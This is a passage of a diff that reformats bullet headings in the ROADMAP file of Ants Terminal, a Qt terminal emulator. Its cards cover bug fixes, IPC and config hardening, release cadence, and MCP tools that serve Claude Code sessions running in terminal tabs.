+- ✅ [ANTS-1327] **Tasks chip + dialog now mirror Claude Code's sidebar — full session history across `/compact`** (shipped
   2026-05-14, supersedes ANTS-1224). User feedback 2026-05-14: "if
   we going to offer this to users, what CC is showing is what the
   button / dialog should be showing." The 0.7.82 contract
@@ -30573,9 +30373,7 @@ GUI/PTY end to end. Item 2 depends on item 1.
   Kind: behaviour-change.
   Source: user-feedback-2026-05-14.
 
-- ✅ [ANTS-1326] **Scroll-to-bottom chip clipped off the widget's
-  right edge — app-wide `QPushButton` rule cascading through the
-  chip's inline stylesheet** (shipped 2026-05-14). User report
+- ✅ [ANTS-1326] **Scroll-to-bottom chip clipped off the widget's right edge — app-wide `QPushButton` rule cascading through the chip's inline stylesheet** (shipped 2026-05-14). User report
   2026-05-14: "back-to-bottom button is being cut off on the side
   of the screen — previously it was a nice round circle just to
   the left of the right hand side of the screen." Root cause: the
@@ -30602,8 +30400,7 @@ GUI/PTY end to end. Item 2 depends on item 1.
   Kind: bugfix.
   Source: user-report-2026-05-14.
 
-- ✅ [ANTS-1324] **UBSan `qpointer.h:75` downcast — destroyed()
-  predicate's `p.data()` runs while `~QWidget()` is on the stack**
+- ✅ [ANTS-1324] **UBSan `qpointer.h:75` downcast — destroyed() predicate's `p.data()` runs while `~QWidget()` is on the stack**
   (shipped 2026-05-14, follow-up to ANTS-1320). ANTS-1320 thought it
   was avoiding the bad downcast by casting the *result* of `p.data()`
   back UP to `QObject*`. But `QPointer<TerminalWidget>::data()` itself
@@ -30633,8 +30430,7 @@ GUI/PTY end to end. Item 2 depends on item 1.
   Kind: bugfix.
   Source: asan-2026-05-14.
 
-- ✅ [ANTS-1321] **Stylesheet `%3` / `%6` placeholder reuse — CSS
-  vs SVG-data-URI context collision** (shipped 2026-05-14).
+- ✅ [ANTS-1321] **Stylesheet `%3` / `%6` placeholder reuse — CSS vs SVG-data-URI context collision** (shipped 2026-05-14).
   `themedstylesheet::buildAppStylesheet` pre-encoded `textPrimary`
   + `textSecondary` colours as `%23RRGGBB` (URL-encoded `#`) so
   the data-URI SVG inside `QTabBar::close-button` `image: url(...)`
@@ -30659,8 +30455,7 @@ GUI/PTY end to end. Item 2 depends on item 1.
   Kind: bugfix.
   Source: asan-2026-05-14.
 
-- ✅ [ANTS-1320] **Heap-use-after-free at close — destroyed-signal
-  lambda outlives the QList it captures.** ASan repro 2026-05-13
+- ✅ [ANTS-1320] **Heap-use-after-free at close — destroyed-signal lambda outlives the QList it captures.** ASan repro 2026-05-13
   pinpointed the cause: `MainWindow::connectTerminal` registered a
   `terminal->destroyed` lambda that captured `this` and indexed
   into `m_allTerminals` (a `QList<QPointer<TerminalWidget>>`
@@ -30697,8 +30492,7 @@ window. Last ad-hoc release: 0.7.91 (2026-05-13). Bootstrap week
 2026-05-20 cuts only the first RC; public cadence steady-state
 starts 2026-05-27.
 
-- ✅ [ANTS-1318] **Weekly Wednesday release cadence + Patron-tier
-  frozen-RC pipeline.**
+- ✅ [ANTS-1318] **Weekly Wednesday release cadence + Patron-tier frozen-RC pipeline.**
   In progress 2026-05-20 (RC pipeline bootstrap): tooling shipped — `release.yml`
   RC-aware AppImage channel split (INV-8) + prerelease backstop
   (INV-5); new project-local `packaging/cut-rc.sh`
@@ -30752,8 +30546,7 @@ expected token-leverage per implementation hour.
 
 #### 🔌 Tight-loop iteration (build / test / diagnose)
 
-- ✅ [ANTS-1299] **`build_status` MCP — cached build outcome + extracted
-  errors.** Shipped 2026-05-19, pull 34. Op-dispatched `record`/`read`
+- ✅ [ANTS-1299] **`build_status` MCP — cached build outcome + extracted errors.** Shipped 2026-05-19, pull 34. Op-dispatched `record`/`read`
   surface over `<root>/.audit_cache/build.json` (schema_version 1).
   `op=record` parses GCC/clang/cppcheck-2.x compiler output into
   `errors:[{file, line, severity, message}]` + `warnings_count`
@@ -30770,8 +30563,7 @@ expected token-leverage per implementation hour.
   Kind: implement.
   Source: indie-review-2026-05-13.
 
-- ✅ [ANTS-1300] **`test_results` MCP — last test run summary + failure
-  excerpts.** Shipped 2026-05-19, pull 34. Sibling op surface to
+- ✅ [ANTS-1300] **`test_results` MCP — last test run summary + failure excerpts.** Shipped 2026-05-19, pull 34. Sibling op surface to
   ANTS-1299; cache at `<root>/.audit_cache/tests.json`. `op=record`
   parses `ctest --output-on-failure` into `{passed, failed, skipped,
   total, failing_tests:[{name, excerpt}], duration_ms}`. Each
@@ -30790,8 +30582,7 @@ expected token-leverage per implementation hour.
   Kind: implement.
   Source: indie-review-2026-05-13.
 
-- ✅ [ANTS-1301] **`recent_errors` MCP — extract compile/test/runtime
-  errors from scrollback.** Shipped 2026-05-20 (Pull 36). Whenever the
+- ✅ [ANTS-1301] **`recent_errors` MCP — extract compile/test/runtime errors from scrollback.** Shipped 2026-05-20 (Pull 36). Whenever the
   user just ran a command that emitted compile errors / test failures
   / runtime panics / linter complaints, Claude had to either re-run
   the command or `get_text` the whole scrollback. New Qt6::Core-only
@@ -30816,8 +30607,7 @@ expected token-leverage per implementation hour.
   Kind: implement.
   Source: indie-review-2026-05-13.
 
-- ✅ [ANTS-1302] **`focused_test` MCP — run only tests touching the
-  changed files.** Shipped 2026-05-20 (Pull 38). Takes a
+- ✅ [ANTS-1302] **`focused_test` MCP — run only tests touching the changed files.** Shipped 2026-05-20 (Pull 38). Takes a
   `changed_files: [...]`
   list (or auto-derives from git working-tree status), maps
   each to its test targets via a project-supplied
@@ -30844,8 +30634,7 @@ expected token-leverage per implementation hour.
 
 #### 🔌 Better context, less reading
 
-- ✅ [ANTS-1303] **`find_definition` + `find_caller` MCP — cheap symbol
-  queries without full LSP.** Shipped 2026-05-20 (Pull 35). Two of the
+- ✅ [ANTS-1303] **`find_definition` + `find_caller` MCP — cheap symbol queries without full LSP.** Shipped 2026-05-20 (Pull 35). Two of the
   most-frequent Claude tasks: "where is `FunctionName` defined?" and
   "what calls `FunctionName`?". Both burned 4–6 grep + Read cycles.
   New Qt6::Core-only `SymbolQuery` lib (`src/symbolquery.{h,cpp}`,
@@ -30868,8 +30657,7 @@ expected token-leverage per implementation hour.
   Kind: implement.
   Source: indie-review-2026-05-13.
 
-- ✅ [ANTS-1304] **`grep_context` MCP — matches with ±N lines of
-  surrounding context.** `workspace_search` already exists but
+- ✅ [ANTS-1304] **`grep_context` MCP — matches with ±N lines of surrounding context.** `workspace_search` already exists but
   returns only the match line. New variant (or `--context=N` flag)
   returns each match with ±3 lines of context inline. Saves the
   inevitable "grep returned `foo.cpp:42`, now I read `foo.cpp`
@@ -30880,8 +30668,7 @@ expected token-leverage per implementation hour.
   Kind: refactor.
   Source: indie-review-2026-05-13.
 
-- ✅ [ANTS-1305] **`similar_code` MCP — pattern matcher for existing
-  project shapes.** Shipped 2026-05-20 (Pull 39). Before writing a new
+- ✅ [ANTS-1305] **`similar_code` MCP — pattern matcher for existing project shapes.** Shipped 2026-05-20 (Pull 39). Before writing a new
   dialog, AI is supposed to
   reuse the project's existing dialog pattern. Today Claude re-derives
   the pattern from scratch (or worse, doesn't). New MCP walks
@@ -30907,8 +30694,7 @@ expected token-leverage per implementation hour.
 
 #### 🔌 Right-first-time via context completeness
 
-- ✅ [ANTS-1306] **`task_priors` MCP — bundled context for a task
-  description.** Shipped 2026-05-20 (Pull 37). Given a free-text task
+- ✅ [ANTS-1306] **`task_priors` MCP — bundled context for a task description.** Shipped 2026-05-20 (Pull 37). Given a free-text task
   description (the user's
   initial prompt or a sub-task), return: matching `docs/specs/*.md`
   files (`grep -l` then return excerpts), matching ROADMAP cards
@@ -30928,8 +30714,7 @@ expected token-leverage per implementation hour.
   Kind: implement.
   Source: indie-review-2026-05-13.
 
-- ✅ [ANTS-1307] **`project_conventions` MCP — compact convention
-  summary.** Shipped 2026-05-20 (Pull 37). Today CLAUDE.md is read
+- ✅ [ANTS-1307] **`project_conventions` MCP — compact convention summary.** Shipped 2026-05-20 (Pull 37). Today CLAUDE.md is read
   every session — 330 lines of
   conventions, ~3 K tokens, even when only a small subset is
   relevant. New MCP returns just the conventions matching the
@@ -30951,8 +30736,7 @@ expected token-leverage per implementation hour.
   Kind: implement.
   Source: indie-review-2026-05-13.
 
-- ✅ [ANTS-1308] **`invariant_check` MCP — list invariants touched
-  by a proposed edit.** Shipped 2026-05-19 (Pull 33). Takes
+- ✅ [ANTS-1308] **`invariant_check` MCP — list invariants touched by a proposed edit.** Shipped 2026-05-19 (Pull 33). Takes
   `files:[<rel-path>...]` and scans `docs/specs/ANTS-*.md` for
   specs that mention any of those paths in their body, returning
   the parsed invariant list per matching spec. Envelope:
@@ -30974,8 +30758,7 @@ expected token-leverage per implementation hour.
   Kind: implement.
   Source: indie-review-2026-05-13.
 
-- ✅ [ANTS-1309] **`spec_query` MCP — fetch a single spec's INV
-  list.** Shipped 2026-05-19 (Pull 33). `spec_query
+- ✅ [ANTS-1309] **`spec_query` MCP — fetch a single spec's INV list.** Shipped 2026-05-19 (Pull 33). `spec_query
   id=ANTS-NNNN` parses `docs/specs/<id>.md` and returns
   `{ok, id, title, status, kind, path, size_bytes, mtime_ms,
   invariants:[{id, body, test_surface?}], invariants_count}`. Used
@@ -31043,8 +30826,7 @@ expected token-leverage per implementation hour.
   Source: indie-review-2026-05-13.
   Resolved (2026-05-26): server-side MCP tool landed. New: RemoteControl::cmdLastSelection delegating to TerminalWidget::selectedText() (promoted from private; INV-8). Registered in mainwindow.cpp as TabSpecific; descriptor + token-cost + kindForName + callerCwdContractFor branches added in claudeintegration.cpp. Tab routing: explicit `tab` int wins, else caller_cwd → terminalForCaller → focused fallback. Schema accepts `tab` (int) + `caller_cwd`. Tests: tests/features/mcp_last_selection/ source-grep wiring contract. Full ctest 1647/1647 pass. Ctrl+Shift+K dialog (the UI half of the original ANTS-1312 scope) is deferred to a follow-up — server-side tool alone delivers the token-savings (Claude no longer walks scrollback to find user-selected text).
 
-- 📋 [ANTS-1331] **Prev/next prompt-history navigation on Claude
-  tabs.** When Claude has been running unattended for a while and
+- 📋 [ANTS-1331] **Prev/next prompt-history navigation on Claude tabs.** When Claude has been running unattended for a while and
   the user comes back to a long scrollback, finding "what was the
   prompt I sent before this one?" means manually scrolling /
   searching. Add a small pair of `◀ / ▶` buttons on the Claude tab
@@ -31103,8 +30885,7 @@ roughly-priority order.
   Kind: marketing.
   Source: indie-review-2026-05-13.
 
-- 📋 [ANTS-1314] **60-second demo video — "Claude reading my
-  terminal."** Record a screencast / asciinema cast that shows
+- 📋 [ANTS-1314] **60-second demo video — "Claude reading my terminal."** Record a screencast / asciinema cast that shows
   the token-savings story in 60 seconds: split screen of "Claude
   Code in plain `bash`" vs "Claude Code in Ants Terminal," same
   prompt to both, watch the MCP-equipped session burn ~40 % fewer
@@ -31119,8 +30900,7 @@ roughly-priority order.
   Kind: marketing.
   Source: indie-review-2026-05-13.
 
-- 📋 [ANTS-1315] **`anthropics/claude-code` GitHub Discussion +
-  Anthropic Discord showcase.** Anthropic's official Claude Code
+- 📋 [ANTS-1315] **`anthropics/claude-code` GitHub Discussion + Anthropic Discord showcase.** Anthropic's official Claude Code
   repo has a "Show and tell" / "Showcase" Discussion category
   (verify before posting). A well-written showcase post with the
   ANTS-1314 video, concrete token-savings numbers, and an
@@ -31139,8 +30919,7 @@ roughly-priority order.
   Kind: marketing.
   Source: indie-review-2026-05-13.
 
-- 📋 [ANTS-1316] **Distro packaging push — AUR + Flathub + Homebrew
-  formula.** Friction-reducer: every "I had to build from source"
+- 📋 [ANTS-1316] **Distro packaging push — AUR + Flathub + Homebrew formula.** Friction-reducer: every "I had to build from source"
   is a lost user. ROADMAP § Distribution readiness already tracks
   `.deb`/`.rpm`/AUR/Flatpak as a goal; this card is the
   prioritisation push to actually ship them. AUR (Arch user
@@ -31697,8 +31476,7 @@ partition (11 lanes) is documented in this fold-in for reuse.
 > streaming) plus ANTS-1130–1132 (new IDs). Each is a bounded
 > fix-pass; total estimated diff ≤ 600 LoC + new feature tests.
 
-- ✅ **Smooth-scroll snapshot race during streaming — root cause
-  confirmed.** Shipped 2026-05-01 (0.7.65). Cross-referenced into
+- ✅ **Smooth-scroll snapshot race during streaming — root cause confirmed.** Shipped 2026-05-01 (0.7.65). Cross-referenced into
   this Tier-1 table; tracked + detailed under ANTS-1118 in
   §"Scrollback overwrite during streaming (user request
   2026-04-30)" — that is the single canonical bullet for the fix.
@@ -31708,8 +31486,7 @@ partition (11 lanes) is documented in this fold-in for reuse.
   test at `tests/features/scroll_snapshot_intent/`.
   Kind: fix. Source: user-2026-04-30 + indie-review-2026-05-01.
   Lanes: TerminalWidget, terminalgrid (snapshot path).
-- ✅ [ANTS-1130] **VT alt-screen + scroll-region invariants —
-  unified fix-pass.** Shipped 2026-05-01 (0.7.65). Three findings collapsed into one bullet
+- ✅ [ANTS-1130] **VT alt-screen + scroll-region invariants — unified fix-pass.** Shipped 2026-05-01 (0.7.65). Three findings collapsed into one bullet
   because all live in `terminalgrid.cpp` and share the same
   fix-pass review surface:
   1. **DECSET 47/1047/1049 split** (L1 C-1) —
@@ -31758,8 +31535,7 @@ partition (11 lanes) is documented in this fold-in for reuse.
   `tests/features/claude_state_dot_palette/`.
   Kind: fix. Source: indie-review-2026-05-01 (L3).
   Lanes: ptyhandler, claudeintegration, MainWindow.
-- ✅ [ANTS-1132] **IPC socket trust-model gaps — unified
-  hardening.** Shipped 2026-05-01 (0.7.66).
+- ✅ [ANTS-1132] **IPC socket trust-model gaps — unified hardening.** Shipped 2026-05-01 (0.7.66).
   1. **Remote-control `SO_PEERCRED` UID match on accept** (L5
      HIGH-1) — `remotecontrol.cpp` after `nextPendingConnection()`,
      `getsockopt(SO_PEERCRED, ...)`, compare `cred.uid ==
@@ -31802,8 +31578,7 @@ partition (11 lanes) is documented in this fold-in for reuse.
   char wrap boundaries), M-1 (CSI Z, I, `, a, e missing).
   Kind: fix. Source: indie-review-2026-05-01 (L1).
   Lanes: terminalgrid, vtparser.
-- ✅ [ANTS-1134] **Terminal widget: modifier-only key + cache
-  invalidation across scrollback push.** **H-1 shipped 2026-05-01
+- ✅ [ANTS-1134] **Terminal widget: modifier-only key + cache invalidation across scrollback push.** **H-1 shipped 2026-05-01
   (0.7.67)** — modifier-only keypress guard added to
   `keyPressEvent`. **H-2 (span-cache invalidation across
   scrollback push) deferred** — fix needs a `m_lastScrollbackPushed`
@@ -31826,8 +31601,7 @@ partition (11 lanes) is documented in this fold-in for reuse.
   pre-fork-allocation discipline already in place.
   Kind: fix. Source: indie-review-2026-05-01 (L3).
   Lanes: ptyhandler.
-- ✅ [ANTS-1136] **Audit pipeline doc drift + correctness
-  bundle** Shipped 2026-05-01 (0.7.67 + 0.7.68). 5 of 5
+- ✅ [ANTS-1136] **Audit pipeline doc drift + correctness bundle** Shipped 2026-05-01 (0.7.67 + 0.7.68). 5 of 5
   sub-fixes complete. **(0.7.68 closed `RuleQualityTracker`
   durability — `runNextCheck` flushes via
   `m_qualityTracker->save()` on cycle end.)** Original spec body
@@ -31872,8 +31646,7 @@ partition (11 lanes) is documented in this fold-in for reuse.
   guard mirroring `m_reviewProbeInFlight`.
   Kind: fix. Source: indie-review-2026-05-01 (L6).
   Lanes: MainWindow.
-- ✅ [ANTS-1138] **MainWindow re-entrancy: `applyTheme` via
-  auto-profile rules** **`applyTheme` early-return shipped
+- ✅ [ANTS-1138] **MainWindow re-entrancy: `applyTheme` via auto-profile rules** **`applyTheme` early-return shipped
   2026-05-01 (0.7.67)** (no-op when `m_currentTheme == name`).
   **Pattern-cache invalidation on auto_profile_rules change
   deferred** — needs an `autoProfileRulesGen()` counter on
@@ -31912,8 +31685,7 @@ partition (11 lanes) is documented in this fold-in for reuse.
   so the IPC verb's bullet set matches the rendered viewer.
   Kind: fix. Source: indie-review-2026-05-01 (L7).
   Lanes: RoadmapDialog.
-- ✅ [ANTS-1140] **RoadmapDialog perf: Kind double-walk +
-  reverseSections cache** Shipped 2026-05-01 (0.7.70 +
+- ✅ [ANTS-1140] **RoadmapDialog perf: Kind double-walk + reverseSections cache** Shipped 2026-05-01 (0.7.70 +
   0.7.72). Both sub-fixes complete. **0.7.70:**
   reverseTopLevelSections gains a function-local
   thread-local cache keyed on input markdown; History-mode
@@ -31931,8 +31703,7 @@ partition (11 lanes) is documented in this fold-in for reuse.
   keyed on `(markdown.size(), markdown.left(64).hash())`.
   Kind: refactor. Source: indie-review-2026-05-01 (L7).
   Lanes: RoadmapDialog.
-- ✅ [ANTS-1141] **Config + persistence: dir perms 0700,
-  load-fail setters, parent fsync, .tmp cleanup** Shipped
+- ✅ [ANTS-1141] **Config + persistence: dir perms 0700, load-fail setters, parent fsync, .tmp cleanup** Shipped
   2026-05-01 (0.7.67 + 0.7.68). 5 of 5 sub-fixes complete.
   **(0.7.68 closed parent-dir fsync — new
   `secureio::fsyncParentDir(path)` helper called after every
@@ -31963,8 +31734,7 @@ partition (11 lanes) is documented in this fold-in for reuse.
      overwrites on save anyway).
   Kind: fix. Source: indie-review-2026-05-01 (L9).
   Lanes: Config, SessionManager.
-- ✅ [ANTS-1142] **Wayland integration: portal queue wedge,
-  KDE guard, debug log perms race** Shipped 2026-05-01
+- ✅ [ANTS-1142] **Wayland integration: portal queue wedge, KDE guard, debug log perms race** Shipped 2026-05-01
   (0.7.67 + 0.7.68 + 0.7.69). **4 of 4 sub-fixes complete.**
   **(0.7.68 closed MainWindow listening to
   `GlobalShortcutsPortal::sessionFailed` with `qWarning` +
@@ -32000,8 +31770,7 @@ partition (11 lanes) is documented in this fold-in for reuse.
   Kind: fix. Source: indie-review-2026-05-01 (L11).
   Lanes: globalshortcutsportal, kwinpositiontracker, debuglog,
   MainWindow.
-- ✅ [ANTS-1143] **PLUGINS.md spec drift + Lua wall-clock
-  watchdog** Shipped 2026-05-01 (0.7.67) — doc fixes only;
+- ✅ [ANTS-1143] **PLUGINS.md spec drift + Lua wall-clock watchdog** Shipped 2026-05-01 (0.7.67) — doc fixes only;
   the optional Lua wall-clock watchdog explicitly stays
   out-of-scope per the original spec text. (L8 MEDIUM-1, MEDIUM-2). Doc fix: add
   `string.dump` to sandbox-removal list; replace `os.date()`
@@ -32013,8 +31782,7 @@ partition (11 lanes) is documented in this fold-in for reuse.
   wall-time intervals.
   Kind: doc-fix. Source: indie-review-2026-05-01 (L8).
   Lanes: PLUGINS.md, luaengine.
-- ✅ [ANTS-1144] **Other dialogs: AI partial-stream insert,
-  transcript large-doc render, BgTasks ANSI-strip** Shipped
+- ✅ [ANTS-1144] **Other dialogs: AI partial-stream insert, transcript large-doc render, BgTasks ANSI-strip** Shipped
   2026-05-01 (0.7.67 + 0.7.68 + 0.7.69). **3 of 3 sub-fixes
   complete.** Transcript dialog now caps render to last 2000
   entries with a "showing last N of M" header.
@@ -32068,8 +31836,7 @@ partition (11 lanes) is documented in this fold-in for reuse.
   dialog (in-flight probes get killed on dialog close — strict
   improvement vs. previous zombie-process behaviour).
   Kind: refactor. Source: indie-review-2026-05-01 (L6).
-- ✅ [ANTS-1146] **Extract ClaudeStatusBarController from
-  mainwindow.cpp** — Shipped 0.7.74 (2026-05-02). L6 LoC2
+- ✅ [ANTS-1146] **Extract ClaudeStatusBarController from mainwindow.cpp** — Shipped 0.7.74 (2026-05-02). L6 LoC2
   carve-out into `src/claudestatuswidgets.{cpp,h}` (770 LoC).
   Six signal-out + four std::function provider injection +
   resetForTabSwitch atomic reset bundling the 5-line tab-switch
@@ -32082,8 +31849,7 @@ partition (11 lanes) is documented in this fold-in for reuse.
   claude_state_dot_palette, allowlist_add §D). mainwindow.cpp:
   6249 → 5656 LoC (-593).
   Kind: refactor. Source: indie-review-2026-05-01 (L6).
-- ✅ [ANTS-1147] **Extract themedstylesheet from
-  mainwindow.cpp** — Shipped 0.7.74 (2026-05-02). L6 LoC3
+- ✅ [ANTS-1147] **Extract themedstylesheet from mainwindow.cpp** — Shipped 0.7.74 (2026-05-02). L6 LoC3
   carve-out into `src/themedstylesheet.{cpp,h}` (272 LoC).
   Six pure-function helpers (buildAppStylesheet +
   buildMenuBarStylesheet + buildStatusMessageStylesheet +
@@ -32098,8 +31864,7 @@ partition (11 lanes) is documented in this fold-in for reuse.
   tests/features/themedstylesheet_extraction/. mainwindow.cpp:
   5656 → 5464 LoC (-192).
   Kind: refactor. Source: indie-review-2026-05-01 (L6).
-- ✅ [ANTS-1148] **DEC mode 2026 (sync output) unified
-  snapshot path** — Shipped 0.7.75 (2026-05-02). L2 C-2 from
+- ✅ [ANTS-1148] **DEC mode 2026 (sync output) unified snapshot path** — Shipped 0.7.75 (2026-05-02). L2 C-2 from
   indie-review-2026-05-01. Pre-fix the implementation suppressed
   `onVtBatch`'s own `update()` during BSU but other paint
   triggers (blinkCursor, focusIn/Out, hover, selection,
@@ -32183,8 +31948,7 @@ Project's own grep-rule corpus + fixture coverage: **55 pass,
 
 ### 🎨 Persistence sweep — make UI state stick across sessions (user request 2026-05-01)
 
-- ✅ [ANTS-1150] **Audit every piece of UI / chrome state and
-  persist what makes sense across sessions** — Phase 1 shipped
+- ✅ [ANTS-1150] **Audit every piece of UI / chrome state and persist what makes sense across sessions** — Phase 1 shipped
   0.7.76 (2026-05-02). User ask 2026-05-01: *"Everything that
   makes sense to persist across sessions, please make that
   persist."* Phase 1 cohort = 6 of the candidates below
@@ -32235,8 +31999,7 @@ Project's own grep-rule corpus + fixture coverage: **55 pass,
 
 ### 🐛 Crash-safe session persistence (user report 2026-05-02)
 
-- ✅ [ANTS-1159] **Save session state on a periodic timer + tab
-  events, not only on `closeEvent`.** Shipped 2026-05-02 in 0.7.77. User reported 2026-05-02
+- ✅ [ANTS-1159] **Save session state on a periodic timer + tab events, not only on `closeEvent`.** Shipped 2026-05-02 in 0.7.77. User reported 2026-05-02
   that after a SIGSEGV (which turned out to be a stale-binary
   side-effect — see triage below), restart restored zero tabs.
   Pre-fix code calls `saveAllSessions()` only from
@@ -32261,9 +32024,7 @@ Project's own grep-rule corpus + fixture coverage: **55 pass,
 
 ### 🎨 Claude Code UX — task-list status-bar surface (user request 2026-05-02)
 
-- ✅ [ANTS-1158] **Status-bar widget + dialog showing the active
-  Claude Code session's task list with status (completed,
-  in-progress, pending).** Shipped 2026-05-02 in 0.7.77. User ask 2026-05-02: *"When Claude
+- ✅ [ANTS-1158] **Status-bar widget + dialog showing the active Claude Code session's task list with status (completed, in-progress, pending).** Shipped 2026-05-02 in 0.7.77. User ask 2026-05-02: *"When Claude
   Code has a task list, please add a button to the task bar
   that brings up a dialog that shows all the tasks. It must
   show the task status (completed, running, outstanding)."*
@@ -32284,8 +32045,7 @@ Project's own grep-rule corpus + fixture coverage: **55 pass,
 
 ### 🐛 Claude Code UX — Task List dialog stale across sessions (user report 2026-05-07)
 
-- ✅ [ANTS-1163] **Task List dialog shows tasks from a previous
-  Claude Code session after a fresh launch.** Shipped 2026-05-07
+- ✅ [ANTS-1163] **Task List dialog shows tasks from a previous Claude Code session after a fresh launch.** Shipped 2026-05-07
   on `main` (Unreleased section of CHANGELOG; will land in the
   next 0.7.x release). User report 2026-05-07: *"there is still
   this task list even though I rebooted and just started up a
@@ -32326,8 +32086,7 @@ Project's own grep-rule corpus + fixture coverage: **55 pass,
 
 ### 🐛 Claude Code UX — bottom status-bar `Claude:` widget shows wrong tab's state (user report 2026-05-07)
 
-- ✅ [ANTS-1161] **Bottom-of-window status-bar `Claude: <state>`
-  widget displayed another tab's state.** Shipped 2026-05-08.
+- ✅ [ANTS-1161] **Bottom-of-window status-bar `Claude: <state>` widget displayed another tab's state.** Shipped 2026-05-08.
   User report 2026-05-07: focused tab was "Claude: Ants
   Terminal" with Claude actively presenting a design, but the
   bottom status bar read `Claude: bash`. User hypothesis was
@@ -32366,8 +32125,7 @@ Project's own grep-rule corpus + fixture coverage: **55 pass,
 
 ### 🎨 Roadmap dialog redesign + format spec v2 (user request 2026-05-07)
 
-- 🚧 [ANTS-1160] **Roadmap dialog redesign + format spec v2 —
-  multi-phase initiative.** User report 2026-05-07: today's
+- 🚧 [ANTS-1160] **Roadmap dialog redesign + format spec v2 — multi-phase initiative.** User report 2026-05-07: today's
   Roadmap dialog renders the full Markdown source to HTML in a
   `QTextBrowser`, leaving wall-of-text chrome (intro prose,
   legend, theme groups, section headings) visible even when
@@ -32465,8 +32223,7 @@ Project's own grep-rule corpus + fixture coverage: **55 pass,
 
 ### 🔢 Tasks chip — progress semantics (user feedback 2026-05-12)
 
-- ✅ [ANTS-1246] **Tasks chip — progress semantics + Mode B
-  batch reset.** Shipped 2026-05-12. Two coordinated fixes for
+- ✅ [ANTS-1246] **Tasks chip — progress semantics + Mode B batch reset.** Shipped 2026-05-12. Two coordinated fixes for
   the same user-visible symptom (chip showing wrong / no info
   during an active Claude task list):
   (1) Chip text switches to `☰ <completed>/<total>`, visible
@@ -32566,8 +32323,7 @@ Project's own grep-rule corpus + fixture coverage: **55 pass,
   automatically. Kind: feature. Source: integration-gap-2026-05-12.
   Lanes: tools.
 
-- ✅ [ANTS-1256] **MCP `tools/list` `inputSchema` compliance —
-  zero-arg tools.** Shipped 2026-05-12. The six zero-arg MCP tools
+- ✅ [ANTS-1256] **MCP `tools/list` `inputSchema` compliance — zero-arg tools.** Shipped 2026-05-12. The six zero-arg MCP tools
   (`get_cwd`, `get_session_info`, `get_last_command`,
   `get_git_status`, `get_environment`, `tab_list`) were emitted
   without an `inputSchema` field. Claude Code's MCP client uses Zod
@@ -32640,8 +32396,7 @@ Project's own grep-rule corpus + fixture coverage: **55 pass,
   question. Kind: feature. Source: user-2026-05-12. Lanes: new
   (fileoutline), remotecontrol, claudeintegration, mainwindow.
 
-- ✅ [ANTS-1250] **`git_state` MCP tool (consolidated; status /
-  log / diff via `op` discriminator).** Shipped 2026-05-12. Cold-eyes
+- ✅ [ANTS-1250] **`git_state` MCP tool (consolidated; status / log / diff via `op` discriminator).** Shipped 2026-05-12. Cold-eyes
   decision: collapsed three originally-proposed verbs into one to
   save ~240 permanent schema tokens. Strict rev-range regex (rejects
   leading `-` flag-injection), `--` argv separator + `./` prefix per
@@ -32662,8 +32417,7 @@ Project's own grep-rule corpus + fixture coverage: **55 pass,
   Source: user-2026-05-12. Lanes: new (gitwrap), remotecontrol,
   claudeintegration, mainwindow.
 
-- ✅ [ANTS-1251] **`subsystem` MCP tool (consolidated; map / files /
-  recent_changes via `op`)** — shipped 2026-05-12. Pre-parses the
+- ✅ [ANTS-1251] **`subsystem` MCP tool (consolidated; map / files / recent_changes via `op`)** — shipped 2026-05-12. Pre-parses the
   project's `CLAUDE.md` Module map into `lanes[]` keyed on mtime
   (no wall-clock TTL, INV-2 — concurrent `/indie-review` reviewers
   share warm cache). New `subsystemmap.{h,cpp}` with a defensive
@@ -32753,9 +32507,7 @@ Project's own grep-rule corpus + fixture coverage: **55 pass,
   green. Kind: feature. Source: cold-eyes-2026-05-12. Lanes:
   auditengine, remotecontrol, claudeintegration, mainwindow.
 
-- ✅ [ANTS-1244] **Surface `roadmap_query`, `tab_list`, `get_text`
-  as MCP tools so Claude Code sessions in Ants tabs query terminal
-  state via tool-call instead of `Bash`/`Read`.** Shipped
+- ✅ [ANTS-1244] **Surface `roadmap_query`, `tab_list`, `get_text` as MCP tools so Claude Code sessions in Ants tabs query terminal state via tool-call instead of `Bash`/`Read`.** Shipped
   2026-05-12. Implementation came in under spec estimate
   (~75 LoC total: 8 LoC promoting RemoteControl handlers to
   public, 12 LoC adding setter decls + members + setter bodies,
@@ -32797,8 +32549,7 @@ Project's own grep-rule corpus + fixture coverage: **55 pass,
 
 ### 📊 Claude Code token-usage tracking + reports (user request 2026-05-12)
 
-- 📋 [ANTS-1245] **Track Claude Code token usage per session and
-  expose daily / weekly / monthly reports with graphs.** User ask
+- 📋 [ANTS-1245] **Track Claude Code token usage per session and expose daily / weekly / monthly reports with graphs.** User ask
   2026-05-12: *"I would like token usage tracked and I should be
   able to pull a daily, weekly and monthly report please with
   graphs as well please."* Not blocking; design phase only.
@@ -32900,10 +32651,7 @@ Project's own grep-rule corpus + fixture coverage: **55 pass,
 
 ### 🎨 Claude Code integration platform — terminal-as-workshop for hooks / skills / sub-agents / MCP (user request 2026-05-07)
 
-- 📋 [ANTS-1162] **First-class scaffolding inside Ants Terminal
-  for creating the Claude Code hooks, skills, sub-agents, and
-  MCP server(s) required for the terminal ↔ Claude bidirectional
-  surface.** User ask 2026-05-07: *"We need the terminal to help
+- 📋 [ANTS-1162] **First-class scaffolding inside Ants Terminal for creating the Claude Code hooks, skills, sub-agents, and MCP server(s) required for the terminal ↔ Claude bidirectional surface.** User ask 2026-05-07: *"We need the terminal to help
   create all the Claude Code hooks / skills / subagents required
   to make the terminal and Claude Code talk to each other. I
   think you also mentioned a MCP service."*
@@ -33005,9 +32753,7 @@ Project's own grep-rule corpus + fixture coverage: **55 pass,
 
 ### 🐛 Terminal rendering — server output only updates top half of window (user report 2026-05-07)
 
-- ✅ [ANTS-1187] **Long-running server tab renders new output
-  only into the upper half of the terminal; bottom half stays
-  blank.** Closed by ANTS-1194 (root cause: `TerminalGrid::resize()`
+- ✅ [ANTS-1187] **Long-running server tab renders new output only into the upper half of the terminal; bottom half stays blank.** Closed by ANTS-1194 (root cause: `TerminalGrid::resize()`
   only clamped the scroll region, never grew it). Shipped 0.7.79. User report 2026-05-07, narrowed 2026-05-08: ran a
   Python web server (RetroDB / waitress, then narrowed to
   Flask specifically) in a tab; banner + startup logs print
@@ -33114,9 +32860,7 @@ Project's own grep-rule corpus + fixture coverage: **55 pass,
 
 ### 🐛 Claude Code spinner duplicates in scrollback (user report 2026-05-08)
 
-- 📋 [ANTS-1188] **Claude Code's `Tempering…`/`Sublimating…`
-  status-spinner lines pile up in scrollback instead of
-  overwriting in place.** User report 2026-05-08 (screenshot
